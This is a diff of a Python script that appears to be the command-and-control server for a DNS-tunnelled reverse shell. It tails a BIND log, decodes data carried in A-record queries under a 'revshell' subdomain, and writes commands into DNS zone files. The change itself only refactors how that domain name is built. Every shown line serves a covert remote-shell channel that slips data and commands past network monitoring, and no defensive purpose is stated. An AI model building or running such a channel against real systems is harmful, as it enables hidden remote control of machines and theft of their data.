@@ -53,7 +53,7 @@ p = subprocess.Popen(['tail', '-F', logfile],
 
 data = {}
 
-domain = "dnshell.programm.zip"
+domain = "revshell.dnshell.programm.zip"
 
 
 def getData(code, counter):
@@ -75,9 +75,9 @@ def getData(code, counter):
                     "domain_name": matches[1],
                     "query_class": matches[3],
                     "query_type": matches[4],
-                    "domain_parts": matches[1].replace(f".revshell.{domain}", "").split(".")
+                    "domain_parts": matches[1].replace(f".{domain}", "").split(".")
                 }
-                if query["query_type"] == "A" and query["domain_name"].endswith(f"{code}-{counter}.revshell.{domain}"):
+                if query["query_type"] == "A" and query["domain_name"].endswith(f"{code}-{counter}.{domain}"):
                     thisdata = query["domain_parts"]
 
                     #print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
@@ -164,8 +164,8 @@ def main():
         print("----------------------------------------------------------------")
         print("")
 
-        filename = f"../bind/data/zones/revshell.{domain}.zone"
-        preset = f"../bind/data/zones/revshell.{domain}.preset"
+        filename = f"../bind/data/zones/{domain}.zone"
+        preset = f"../bind/data/zones/{domain}.preset"
 
         command = ""
         counter = 0
